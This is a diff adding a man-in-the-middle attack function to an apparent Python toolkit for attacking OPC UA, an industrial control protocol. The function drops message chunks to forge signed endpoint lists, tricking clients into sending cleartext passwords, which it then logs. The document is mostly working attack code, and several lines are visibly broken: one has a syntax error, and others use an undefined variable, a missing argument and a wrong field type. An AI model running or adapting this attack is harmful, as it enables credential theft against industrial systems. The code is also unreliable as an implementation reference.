@@ -7,7 +7,7 @@ from messages import *
 from message_fields import *
 from typing import *
 from crypto import *
-from socket import socket, create_connection, SHUT_RDWR
+from socket import socket, create_connection, create_server, SHUT_RDWR
 from random import Random, randint
 from enum import Enum, auto
 from binascii import hexlify, unhexlify
@@ -1548,9 +1548,9 @@ def read_client_msg(sock : socket, msg_type : Type[OpcMessage]) -> OpcMessage:
     return msg
 
 # Same for writing.
-def write_client_msg(sock : socket, msg : OpcMessage):
+def write_client_msg(sock : socket, msg : OpcMessage, final_chunk : bool=True):
   with sock.makefile('wb') as sockio:
-    msg.to_bytes(sockio)
+    msg.to_bytes(sockio, final_chunk)
     sockio.flush()
     
 # A client attack is a coroutine that receives client connection sockets.
@@ -1567,7 +1567,7 @@ def client_attack(
   ):
     if revhello_addr is None:
       # Start listening for client connection.
-      listener = socket.create_server((listen_host, listen_port))
+      listener = create_server((listen_host, listen_port))
       log(f'Started listening for an incoming client connections on {listen_host}:{listen_port}.')
       def clientsocker():
         clientsock, peeraddr = listener.accept()
@@ -1741,9 +1741,296 @@ def nonegrade_mitm(server_url : str) -> ClientAttack:
       clientsock.close()
       return
 
-# # MitM attack that uses the chunk dropping attack to modify signed endpoint info to trick a client into exposing its 
-# # password.
-# # If tcp_resets is True intentional connection interruptions will be introduced to make a client accept gaps even when
-# # it is strictly enforcing https://reference.opcfoundation.org/Core/Part6/v104/docs/6.7.2.4
-# def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
-#   
+# MitM attack that uses the chunk dropping attack to modify signed endpoint info to trick a client into exposing its 
+# password.
+# If tcp_resets is True intentional connection interruptions will be introduced to make a client accept gaps even when
+# it is strictly enforcing https://reference.opcfoundation.org/Core/Part6/v104/docs/6.7.2.4
+def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
+  if tcp_resets:
+    raise Exception('tcp_resets feature not yet implemented')
+  
+  # Given a binary endpoint array, this will return a list of byteranges to drop to turn the result into a suitable 
+  # endpoint description.
+  # Attempts to create an array with a single endpoint with a Sign security mode that requires an unencrypted password.
+  def ranges_to_drop(ep_bytes):    
+    # Store offsets and values of array elements.
+    epcount, todo = IntField().from_bytes(ep_bytes)
+    offsets = [None] * epcount
+    for i in range(0, epcount):
+      offsets[i] = len(ep_bytes) - len(todo)
+      _, todo = endpointDescription.from_bytes(todo)
+      
+    # State for subroutines to update.
+    cursor = 0
+    result = []
+    
+    # Drop a certain amount of bytes. Throws an error if end is reached.
+    def dropbytes(count):
+      nonlocal cursor, result
+      if count == 0:
+        return
+      
+      assert(count > 0)
+      if cursor < len(ep_bytes):
+        if result and result[-1][1] == cursor:
+          result[-1][1] += count
+        else:
+          result += [(cursor, cursor + count)]
+        cursor += count
+      else:
+        errormsg = 'Server endpoint list did not allow desired mutation'
+        if epcount == 1:
+          errormsg += ' because it only contained a single endpoint'
+        elif epcount < 4:
+          errormsg += f'. Probably because it only contained {epcount} entries'
+        errormsg += '.\n Perhaps try against a discovery service instead?'
+        raise AttackNotPossible(errormsg)
+    
+    # Keep dropping ranges until a specific desired byte range is added to the result.
+    def drop_until_bytes(byteseq):
+      nonlocal cursor
+      
+      tomatch = byteseq
+      while tomatch:
+        if ep_bytes and ep_bytes[0] == tomatch[0]:
+          cursor += 1
+          tomatch = tomatch[1:]
+        else:
+          dropbytes(1)
+    
+    # Drop bytes until the cursor is positioned in front of a specific endpoint field.
+    def drop_until_field(fieldname):
+      nonlocal cursor
+      
+      # Find starting offset of endpoint the cursor is currently in.
+      rcursor = max(offset for offset in offsets if offset <= cursor, default=offsets[0])
+      
+      # Keep consuming endpoint description until either cursor or field is reached.
+      # Run through the description at most twice.
+      for _ in range(0,2):
+        for descName, descType in endpointDescription.fields:
+          if rcursor > cursor:
+            dropbytes(rcursor - cursor)
+            
+          if rcursor == cursor and descName == fieldname:
+            # Got it.
+            return
+          else:
+            rcursor = len(ep_bytes) - len(descType.from_bytes(ep_bytes[rcursor:])[1])
+          
+      # Should have returned or raised by now, if fieldname is valid.
+      assert(False)
+      
+    # Consume a field. Keep it (and return True) if it meets the predicate. Otherwise drop it.
+    def checkfield(fieldType, predicate=lambda _: True):
+      nonlocal cursor
+      
+      field, tail = fieldType.from_bytes(ep_bytes[cursor:])
+      fieldsize = len(ep_bytes) - cursor - len(tail) 
+      if predicate(field):
+        cursor += fieldsize
+        return True
+      else:
+        dropbytes(fieldsize)
+        return False
+      
+    # First, make the resulting array length one.
+    drop_until_bytes(b'\x01\x00\x00\x00')
+    
+    # Keep general server info.
+    checkfield(StringField()) # endpointUrl
+    checkfield(applicationDescription) # server
+    checkfield(ByteStringField()) # serverCertificate
+    
+    # Spoof a Sign security mode.
+    drop_until_bytes(b'\x02\x00\x00\x00')
+    
+    # Next a non-None security policy is needed for channel security.
+    while not checkfield(SecurityPolicyField(), lambda sp: sp != SecurityPolicy.NONE):
+      drop_until_field('securityPolicyUri')
+        
+    # Set Identity token array and policyId string lengths to 1.
+    drop_until_bytes(b'\x01\x00\x00\x00' * 2)
+    
+    # Set single policyId character to whatever.
+    dropbytes(1)
+    
+    # Enforce UserName token type.
+    drop_until_bytes(EnumField(UserTokenType).to_bytes(UserTokenType.USERNAME))
+    
+    # Two null strings.
+    drop_until_bytes(b'\xff' * 8)
+    
+    # Finally make a None security policy is needed for password security.
+    # This will probably either a subsequent None endpoint or token policy. But otherwise there's a good change the 
+    # prefix can be taken from some other policy and the four bytes spelling out "None" from certificate data.
+    drop_until_bytes(SecurityPolicyField().to_bytes(SecurityPolicy.NONE))
+    
+    # Finish with a TCP transport profile.
+    drop_until_field('transportProfileUri')
+    while not checkfield(StringField(), lambda: pu: pu.endswith('uatcp-uasc-uabinary')):
+      drop_until_field('transportProfileUri')
+      
+    # Any security level will do.
+    checkfield('securityLevel')
+    
+    # Finally, drop all remaining bytes.
+    dropbytes(len(ep_bytes) - cursor)
+    return result
+  
+  # Grab server endpoints list.
+  server_eps = get_endpoints(server_url)
+  log(f'Got {len(server_eps)} server endpoints from {server_url}. Testing if attack is applicable.')
+  
+  # Test if rangedropping works on this endpoint list.
+  server_epbytes = ArrayField(endpointDescription).to_bytes(server_eps)
+  dropranges = ranges_to_drop(server_epbytes)
+  
+  if not any(ep.securityMode == MessageSecurityMode.SIGN):
+    log('Warning: server does not advertise Sign security mode. Attack will probably not work, but trying anyway.')
+  
+  # Compute new endpoint list (and double-check if calculation was correct).
+  spoofed_epbytes = b''
+  prev_end = 0
+  for start, end in dropranges:
+    spoofed_epbytes += server_epbytes[prev_end:start]
+    prev_end = end
+  spoofed_epbytes += server_epbytes[prev_end:]
+  spoofed_ep = ArrayField(endpointDescription).from_bytes(spoofed_epbytes)[0]
+  
+  assert(spoofed_ep.securityMode == MessageSecurityMode.SIGN and spoofed_ep.userIdentityTokens[0].tokenType == UserTokenType.USERNAME)
+  log_success('Succesfully transformed token list into spoofed (password revealing) variant.')
+  
+  # Use server associated with this endpoint as upstream.
+  proto, serverhost, serverport = parse_endpoint_url(spoofed_ep.endpointUrl)
+  assert proto == TransportProtocol.TCP_BINARY
+  log(f'Using {serverhost}:{serverport} as upstream server.')
+  
+  # Check if server allows tiny chunks.
+  spoofed_hello = HelloMessage(
+    version=0,
+    receiveBufferSize=2**16,
+    sendBufferSize=2**16,
+    maxMessageSize=1,
+    maxChunkCount=2**16-1,
+    endpointUrl=spoofed_ep.endpointUrl,
+  )
+  with create_connection((serverhost, serverport)) as serversock:
+    opc_exchange(serversock, spoofed_hello, AckMessage())
+    log_success(f'Server appears to accept maxMessageSize of 1 and maxChunkCount of {spoofed_hello.maxChunkCount}')
+  
+  
+  # MitM loop.
+  while True:
+    clientsock = yield
+    with create_connection((serverhost, serverport)) as serversock:
+      log('Connected to both client and server.')
+      
+      read_client_msg(clientsock, HelloMessage)
+      log('Got Hello from client. Sending spoofed version to server.')
+      write_client_msg(opc_exchange(serversock, spoofed_hello, AckMessage()))
+      
+      # Forward OPN. Response may be chunked.
+      client_opn = read_client_msg(clientsock, OpenSecureChannelMessage)
+      cleartext = client_opn.securityPolicyUri == SecurityPolicy.NONE
+      log(f'Forwarding {"cleartext" if cleartext else "encrypted"} OpenSecureChannelRequest')
+      chunks = list(chunkable_opc_exchange(serversock, client_opn))
+      for i, chunk in enumerate(chunks):
+        write_client_msg(clientsock, chunk, i == len(chunks) - 1)
+      
+      # Keep processing conversation messages until the attack is finished or the client closes the channel.
+      # Usually the latter will happen once the client has received the (spoofed) endpoint list, which it
+      # will then use for a second connection.
+      try:
+        while True:
+          client_convo = read_client_msg(clientsock, ConversationMessage)
+          
+          # Check client message.
+          try:
+            reqbytes, _ = encodedConversation.from_bytes(client_convo.encodedPart)
+          except DecodeError as err:
+            if not cleartext:
+              raise AttackNotPossible('Could not decode conversation. It is probably using SignAndEncrypt mode.')
+            else:
+              raise err
+          
+          if activateSessionRequest.check_type(reqbytes):
+            # Got what we want.
+            asr, _ = activateSessionRequest.from_bytes(reqbytes)
+            log_success('Received unencrypted ActivateSessionRequest')
+            log_success(f'Username: {asr.userIdentityToken.userName}')
+            if asr.userIdentityToken.encryptionAlgorithm:
+              log('However, password is still encrypted.')
+            else:
+              pwd = asr.userIdentityToken.password.decode(errors="replace")
+              log_success(f'Password: {pwd}')
+            
+            # Done.
+            return
+          
+          else:
+            log('Forwarding ConversationMessage to server...')
+            server_chunks = list(chunkable_opc_exchange(serversock, client_convo))
+            log(f'Got {len(server_chunks)} chunks back.')
+            
+            # Glue chunks back together, dropping any signatures.
+            resp_parts = list(encodedConversation.from_bytes(c.encodedPart)[0].requestOrResponse for c in server_chunks)
+            respbytes = b''.join(resp_parts)
+
+                
+            # Handling depends on response type.
+            if getEndpointsResponse.check_type(respbytes):
+              resp, _ = getEndpointsResponse.from_bytes(respbytes)
+              log('Endpoints request: replacing result with spoofed endpoint.')
+              write_client_msg(clientsock, ConversationMessage(
+                secureChannelId=server_chunks[0].secureChannelId,
+                tokenId=server_chunks[0].tokenId,
+                encodedPart=encodedConversation.from_bytes(server_chunks[0].encodedPart)._replace(
+                  requestOrResponse=resp._replace(endpoints=[spoofed_ep])
+                )
+              ))
+            elif createSessionResponse.check_type(respbytes):
+              if not all(len(part) == 1 for part in resp_parts):
+                raise AttackNotPossible('Got CreateSessionResponse, but not all chunks are one byte long.')
+            
+              # Find the binary offset and length of the endpoint list.
+              todo = respbytes
+              for fieldName, fieldType in createSessionResponse.fields:
+                if fieldName == 'serverEndpoints':
+                  eplist_start = len(todo)
+                  _, todo = fieldType.from_bytes(todo)
+                  eplist_end = len(todo)
+                  break
+                else:
+                  _, todo = fieldType.from_bytes(todo)
+              
+              # Run the range dropping algorithm again. It may fail if more fields are ommitted.
+              dropranges = ranges_to_drop(respbytes[eplist_start:eplist_end])
+              log_success('Managed to drop ranges from CreateSessionResponse as well.')
+              
+              # Adjust for full response body.
+              dropranges = [(start + eplist_start, end + eplist_start) for start, end in dropranges]
+              
+              # Drop associated chunks.
+              keep_chunks = []
+              lastend = 0
+              for start, end in dropranges:
+                keep_chunks += server_chunks[lastend:start]
+                lastend = end
+              keep_chunks += server_chunks[lastend:]
+              
+              # Send these to the client.
+              log('Sending selected subset of chunks to client...')
+              for chunk in keep_chunks[:-1]:
+                write_client_msg(clientsock, chunk, False)
+              write_client_msg(clientsock, keep_chunks[-1], True)
+            
+            else:
+              log('Unknown message type. Forwarding it anyway.')
+              for chunk in server_chunks[:-1]:
+                write_client_msg(clientsock, chunk, False)
+              write_client_msg(clientsock, server_chunks[-1], True)
+          
+      except ClientClosedChannel:
+        pass
+      
